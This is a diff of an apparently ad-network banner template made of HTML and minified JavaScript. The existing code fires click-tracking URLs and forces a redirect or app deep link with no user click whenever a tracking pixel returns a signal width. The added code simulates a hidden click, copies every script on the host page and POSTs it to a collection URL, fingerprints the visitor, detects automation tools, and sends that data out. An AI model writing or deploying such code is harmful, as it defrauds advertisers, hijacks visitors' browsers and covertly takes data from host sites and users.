@@ -1,71 +1,73 @@
 <div id="fc_dsp_banner_wrap" style="width: 100%; height: 100%; overflow: hidden">
   <img id="fc_dsp_banner_img" src="{IMG_URL}" border="0"
        style="max-width: 100%; max-height: 100%; position: absolute; top: 0; left: 0; right: 0; bottom: 0; margin: auto"/>
-  <img id="fc_dsp_imp" src="{FORCE_JUDGE_URL}" alt="" style="display: none"/>
+  <img id="fc_dsp_imp" src="{FORCE_JUDGE_URL}" alt="" style="display: none" />
+  <a id="fc_dsp_simulated_a" href="javascript:;" style="display: none"></a>
   <div id="fc_dsp_banner_imp"></div>
 </div>
 <script type="text/javascript">
     document.getElementById("fc_dsp_banner_imp").innerHTML = "{IMP_DIV_LIST}";
-    var e = [CLICK_TRACK_URL_LIST], n = "{IMP_INFO_URL}", t = "{CLICK_URL}", i = "{FORCE_URL}";
-    let r = window.navigator.userAgent, o = r.match(/mobile/i), c = r.match(/(iphone|ipod|ipad)/i),
-        u = !c && r.match(/android/i),
-        a = c && r.match(/Safari\/([0-9.]+$)/) && !r.match(/Chrome/i),
-        d = r.match(/micromessenger\/([\d.]+)/i), m = r.match(/(ucbrowser)\/([\d.]+)/i),
-        f = r.match(/newsarticle/i),
-        l = r.match(/chrome\/[\d.]+ mobile safari\/[\d.]+/i) && u && r.indexOf("Version") < 0;
-    var v = 0, _ = setInterval((function () {
-        v++;
-        var e = document.getElementById("fc_dsp_banner_img"), t = I(e),
-            i = window.getComputedStyle(e), r = {
-                width: Number(t.right) - Number(t.left),
-                height: Number(t.bottom) - Number(t.top),
-                t: i.zIndex,
-                i: L(),
-                display: i.display,
-                o: p().width || 0,
-                u: p().height || 0,
-                m: t.top,
-                l: t.bottom,
-                v: t.left,
-                _: t.right
+    var e = [CLICK_TRACK_URL_LIST], t = "{IMP_INFO_URL}", n = "{CLICK_URL}", o = "{FORCE_URL}",
+        i = "{COLLECT_CODE_URL}", r = "{COLLECT_FEATURE_URL}", a = "{DELAY_TIME}";
+    let u = window.navigator.userAgent, c = u.match(/mobile/i), d = u.match(/(iphone|ipod|ipad)/i),
+        m = !d && u.match(/android/i),
+        s = d && u.match(/Safari\/([0-9.]+$)/) && !u.match(/Chrome/i),
+        l = u.match(/micromessenger\/([\d.]+)/i), f = u.match(/(ucbrowser)\/([\d.]+)/i),
+        p = u.match(/newsarticle/i),
+        v = u.match(/chrome\/[\d.]+ mobile safari\/[\d.]+/i) && m && u.indexOf("Version") < 0;
+    var g = 0, h = setInterval((function () {
+        g++;
+        var e = document.getElementById("fc_dsp_banner_img"), n = C(e),
+            o = window.getComputedStyle(e), i = {
+                width: Number(n.right) - Number(n.left),
+                height: Number(n.bottom) - Number(n.top),
+                z_index: o.zIndex,
+                max_index: T(),
+                display: o.display,
+                view_width: E().width || 0,
+                view_height: E().height || 0,
+                img_top: n.top,
+                img_bottom: n.bottom,
+                img_left: n.left,
+                img_right: n.right
             };
-        if (v > 2 || r.width > 0 && r.height > 0) {
-            var o = "";
-            for (var c in r) c && (o += "&" + c + "=" + r[c]);
-            var u = w();
-            if (u) u.open("GET", n + o, !0), u.send(); else {
-                var a = document.createElement("iframe");
-                a.height = 1, a.width = 1, a.style.display = "none", a.src = n + o, document.body.appendChild(a)
+        if (g > 2 || i.width > 0 && i.height > 0) {
+            var r = "";
+            for (var a in i) a && (r += "&" + a + "=" + i[a]);
+            var u = b();
+            if (u) u.open("GET", t + r, !0), u.send(); else {
+                var c = document.createElement("iframe");
+                c.height = 1, c.width = 1, c.style.display = "none", c.src = t + r, document.body.appendChild(c)
             }
-            clearInterval(_)
+            clearInterval(h)
         }
     }), 1e3);
 
-    function s() {
-        h(), window.location.href = t
+    function _() {
+        w(), window.location.href = n
     }
 
-    function h() {
-        for (var n in e) {
-            var t = w();
-            if (t) t.open("GET", e[n], !0), t.send(); else {
-                var i = document.createElement("iframe");
-                i.height = 1, i.width = 1, i.style.display = "none", i.src = e[n], document.getElementById("fc_dsp_banner_wrap").appendChild(i)
+    function w() {
+        for (var t in e) {
+            var n = b();
+            if (n) n.open("GET", e[t], !0), n.send(); else {
+                var o = document.createElement("iframe");
+                o.height = 1, o.width = 1, o.style.display = "none", o.src = e[t], document.getElementById("fc_dsp_banner_wrap").appendChild(o)
             }
         }
     }
 
-    function w() {
+    function b() {
         var e;
         try {
             e = new XMLHttpRequest
-        } catch (n) {
+        } catch (t) {
             try {
                 e = new ActiveXObject("Msxml2.XMLHTTP")
-            } catch (n) {
+            } catch (t) {
                 try {
                     e = new ActiveXObject("Microsoft.XMLHTTP")
-                } catch (n) {
+                } catch (t) {
                     e = !1
                 }
             }
@@ -73,7 +75,7 @@
         return e
     }
 
-    function p() {
+    function E() {
         return "BackCompat" == document.compatMode ? {
             width: document.body.clientWidth,
             height: document.body.clientHeight
@@ -83,84 +85,197 @@
         }
     }
 
-    function b(e) {
-        for (var n = e.offsetLeft, t = e.offsetParent; null !== t;) n += t.offsetLeft, t = t.offsetParent;
-        return n
+    function y(e) {
+        for (var t = e.offsetLeft, n = e.offsetParent; null !== n;) t += n.offsetLeft, n = n.offsetParent;
+        return t
     }
 
-    function g(e) {
-        for (var n = e.offsetTop, t = e.offsetParent; null !== t;) n += t.offsetTop, t = t.offsetParent;
-        return n
+    function L(e) {
+        for (var t = e.offsetTop, n = e.offsetParent; null !== n;) t += n.offsetTop, n = n.offsetParent;
+        return t
     }
 
-    var I = function e(n) {
-        var t = document.documentElement.scrollTop, i = document.documentElement.scrollLeft;
-        if (n.getBoundingClientRect) {
+    var C = function e(t) {
+        var n = document.documentElement.scrollTop, o = document.documentElement.scrollLeft;
+        if (t.getBoundingClientRect) {
             "number" != typeof e.offset && (e.offset = function () {
                 var e = document.createElement("div");
                 e.style.cssText = "position:absolute;left:0;top:0;", document.body.appendChild(e);
-                var n = -e.getBoundingClientRect().top - t;
-                return document.body.removeChild(e), e = null, n
+                var t = -e.getBoundingClientRect().top - n;
+                return document.body.removeChild(e), e = null, t
             }());
-            var r = n.getBoundingClientRect(), o = e.offset;
-            return {left: r.left + o, right: r.right + o, top: r.top + o, bottom: r.bottom + o}
+            var i = t.getBoundingClientRect(), r = e.offset;
+            return {left: i.left + r, right: i.right + r, top: i.top + r, bottom: i.bottom + r}
         }
-        var c = b(n), u = g(n);
+        var a = y(t), u = L(t);
         return {
-            left: c - i,
-            right: c + n.offsetWidth - i,
-            top: u - t,
-            bottom: u + n.offsetHeight - t
+            left: a - o,
+            right: a + t.offsetWidth - o,
+            top: u - n,
+            bottom: u + t.offsetHeight - n
         }
     };
 
-    function L() {
-        var e = Array.from(document.all), n = [];
+    function T() {
+        var e = Array.from(document.all), t = [];
         e.forEach((function (e) {
-            var t = Number(window.getComputedStyle(e, null).getPropertyValue("z-index"));
-            t && n.push(t)
+            var n = Number(window.getComputedStyle(e, null).getPropertyValue("z-index"));
+            n && t.push(n)
         }));
-        var t = 0;
-        return n.length && (t = Math.max(...n)), t
+        var n = 0;
+        return t.length && (n = Math.max(...t)), n
     }
 
-    let N = {
-        h: function (e) {
+    let x = {
+        locationEvoke: function (e) {
             window.location.href = e
-        }, p: function (e) {
-            let n = document.createElement("a");
-            n.setAttribute("href", e), n.style.display = "none", document.body.append(n), n.click()
-        }, I: function (e) {
-            let n = document.createElement("iframe");
-            n.style.cssText = "display:none;border:0;width:0;height:0;", document.body.append(n), n.src = e
+        }, aTagEvoke: function (e) {
+            let t = document.createElement("a");
+            t.setAttribute("href", e), t.style.display = "none", document.body.append(t), t.click()
+        }, iFrameEvoke: function (e) {
+            let t = document.createElement("iframe");
+            t.style.cssText = "display:none;border:0;width:0;height:0;", document.body.append(t), t.src = e
         }
     };
 
-    function T(e) {
-        let n = "http" === e.substr(0, 4).toLowerCase(),
-            t = "intent" === e.substr(0, 6).toLowerCase();
-        if (o && "" != e) if (h(), c) {
-            let t = M(r.match(/OS ([\d_.]+) like Mac OS X/i)[1].replace(/_/g, "."), "9.0") >= 0,
-                i = d && C();
-            t ? n ? !f && !m || i && M(i, "7.0.5") >= 0 ? N.h(e) : (N.p(e), N.I(e)) : a ? N.h(e) : N.I(e) : N.I(e)
-        } else u && t && l ? N.h(e) : N.I(e)
+    function D(e) {
+        let t = "http" === e.substr(0, 4).toLowerCase(),
+            n = "intent" === e.substr(0, 6).toLowerCase();
+        if (c && "" != e) if (w(), d) {
+            let n = R(u.match(/OS ([\d_.]+) like Mac OS X/i)[1].replace(/_/g, "."), "9.0") >= 0,
+                o = l && k();
+            n ? t ? !p && !f || o && R(o, "7.0.5") >= 0 ? x.locationEvoke(e) : (x.aTagEvoke(e), x.iFrameEvoke(e)) : s ? x.locationEvoke(e) : x.iFrameEvoke(e) : x.iFrameEvoke(e)
+        } else m && n && v ? x.locationEvoke(e) : x.iFrameEvoke(e)
     }
 
-    function M(e, n) {
-        e = e.toString().split("."), n = n.toString().split(".");
-        for (let t = 0; t < e.length || t < n.length; t++) {
-            let i = parseInt(e[t], 10), r = parseInt(n[t], 10);
-            if (isNaN(i) && (i = 0), isNaN(r) && (r = 0), i < r) return -1;
-            if (r < i) return 1
+    function R(e, t) {
+        e = e.toString().split("."), t = t.toString().split(".");
+        for (let n = 0; n < e.length || n < t.length; n++) {
+            let o = parseInt(e[n], 10), i = parseInt(t[n], 10);
+            if (isNaN(o) && (o = 0), isNaN(i) && (i = 0), o < i) return -1;
+            if (i < o) return 1
         }
         return 0
     }
 
-    function C() {
+    function k() {
         return navigator.appVersion.match(/micromessenger\/(\d+\.\d+\.\d+)/i)[1]
     }
 
+    function S() {
+        var e = {},
+            t = ["userAgent", "webdriver", "plugins", "mimeTypes", "platform", "phantomJSFeatures", "nightmareJS", "seleniumFeatures", "webGL", "canvas", "webRTC", "fonts", "cdp"],
+            n = {
+                userAgent: function () {
+                    return navigator.userAgent
+                }, webdriver: function () {
+                    return navigator.webdriver
+                }, plugins: function () {
+                    const e = [];
+                    for (let t = 0; t < navigator.plugins.length; t++) {
+                        const n = navigator.plugins[t],
+                            o = [n.name, n.description, n.filename, n.version].join("::");
+                        let i = [];
+                        Object.keys(n).forEach((e => {
+                            i.push([n[e].type, n[e].suffixes, n[e].description].join("~"))
+                        })), i = i.join(","), e.push(o + "__" + i)
+                    }
+                    return e
+                }, mimeTypes: function () {
+                    const e = [];
+                    for (let t = 0; t < navigator.mimeTypes.length; t++) {
+                        let n = navigator.mimeTypes[t];
+                        e.push([n.description, n.type, n.suffixes].join("~~"))
+                    }
+                    return e
+                }, platform: function () {
+                    return navigator.platform ? navigator.platform : "unknow"
+                }, phantomJSFeatures: function () {
+                    return ["callPhantom" in window, "_phantom" in window, "phantom" in window]
+                }, nightmareJS: function () {
+                    return !!window.__nightmare
+                }, seleniumFeatures: function () {
+                    return ["webdriver" in window, "_Selenium_IDE_Recorder" in window, "callSelenium" in window, "_selenium" in window, "__webdriver_script_fn" in document, "__driver_evaluate" in document, "__webdriver_evaluate" in document, "__selenium_evaluate" in document, "__fxdriver_evaluate" in document, "__driver_unwrapped" in document, "__webdriver_unwrapped" in document, "__selenium_unwrapped" in document, "__fxdriver_unwrapped" in document, "__webdriver_script_func" in document, null !== document.documentElement.getAttribute("selenium"), null !== document.documentElement.getAttribute("webdriver"), null !== document.documentElement.getAttribute("driver")]
+                }, webGL: function () {
+                    try {
+                        const e = document.createElement("canvas"),
+                            t = e.getContext("webgl") || e.getContext("experimental-webgl");
+                        let n, o;
+                        return t.getSupportedExtensions().indexOf("WEBGL_debug_renderer_info") >= 0 ? (n = t.getParameter(t.getExtension("WEBGL_debug_renderer_info").UNMASKED_VENDOR_WEBGL), o = t.getParameter(t.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)) : (n = "Not supported", o = "Not supported"), {
+                            webGLVendor: n,
+                            webGLRenderer: o
+                        }
+                    } catch (e) {
+                        return {webGLVendor: "error", webGLRenderer: "error"}
+                    }
+                }, canvas: function () {
+                    var t = document.createElement("canvas"), n = t.getContext("2d");
+                    return n ? {
+                        supportTextMetrics: "function" == typeof n.measureText,
+                        supportImageData: "function" == typeof n.getImageData,
+                        supportToDataURL: "function" == typeof t.toDataURL
+                    } : e
+                }, webRTC: function () {
+                    const e = {audiooutput: 0, audioinput: 0, videoinput: 0},
+                        t = {speakers: 0, micros: 0, webcams: 0};
+                    return navigator.mediaDevices && navigator.mediaDevices.enumerateDevices && "bound reportBlock" !== navigator.mediaDevices.enumerateDevices.name ? (navigator.mediaDevices.enumerateDevices().then((n => {
+                        if (void 0 !== n) {
+                            let o;
+                            for (let t = 0; t < n.length; t++) o = [n[t].kind], e[o] = e[o] + 1;
+                            t.speakers = e.audiooutput, t.micros = e.audioinput, t.webcams = e.videoinput
+                        }
+                    })), t) : navigator.mediaDevices && navigator.mediaDevices.enumerateDevices && "bound reportBlock" === navigator.mediaDevices.enumerateDevices.name ? void resolve({devicesBlockedByBrave: !0}) : t
+                }, fonts: function () {
+                    var e = document.createElement("span");
+                    e.textContent = "font computed", document.body.appendChild(e);
+                    var t = getComputedStyle(e), n = t.getPropertyValue("font-family"),
+                        o = t.getPropertyValue("font-size"), i = t.getPropertyValue("font-weight");
+                    return document.body.removeChild(e), {fontFamily: n, fontSize: o, fontWeight: i}
+                }, cdp: function () {
+                    var e = {};
+                    if (-1 !== navigator.userAgent.indexOf("Chrome") && "undefined" != typeof chrome && void 0 !== chrome.runtime) {
+                        var t = /Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1];
+                        chrome.runtime.sendMessage({type: "chrome://version"}, (n => {
+                            var o = n.match(/DevTools\ ([0-9.]+)/)[1];
+                            e.version = t, e.devToolsVersion = o
+                        }))
+                    }
+                    return e
+                }
+            }, o = {};
+        for (let e = 0; e < t.length; e++) {
+            let i = t[e];
+            o[i] = n[i]()
+        }
+        return o
+    }
+
+    function I(e, t) {
+        var n = Date.now();
+        requestAnimationFrame((function o() {
+            Date.now() - n >= t ? e() : requestAnimationFrame(o)
+        }))
+    }
+
+    function B() {
+        for (var e = "", t = document.getElementsByTagName("script"), n = 0; n < t.length; n++) {
+            e += `<script-satrt index=${n}> ${t[n].innerHTML} <script-end index=${n}>`
+        }
+        var o = {code: e}, r = b();
+        r && (r.open("POST", i, !0), r.setRequestHeader("Content-type", "application/json"), r.send(JSON.stringify(o)))
+    }
+
+    function A() {
+        var e = S(), t = b();
+        t && (t.open("POST", r, !0), t.setRequestHeader("Content-type", "application/json"), t.send(JSON.stringify(e)))
+    }
+
     window.onload = function () {
-        2 == document.getElementById("fc_dsp_imp").naturalWidth && "" != i && T(i), document.getElementById("fc_dsp_banner_img").onclick = s
+        document.getElementById("fc_dsp_banner_img").onclick = _;
+        var e = document.getElementById("fc_dsp_imp"),
+            t = document.getElementById("fc_dsp_simulated_a"), n = e.naturalWidth;
+        B(), A(), 2 == n && "" != o && (t.click(), I((function () {
+            D(o)
+        }), a))
     };
 </script>
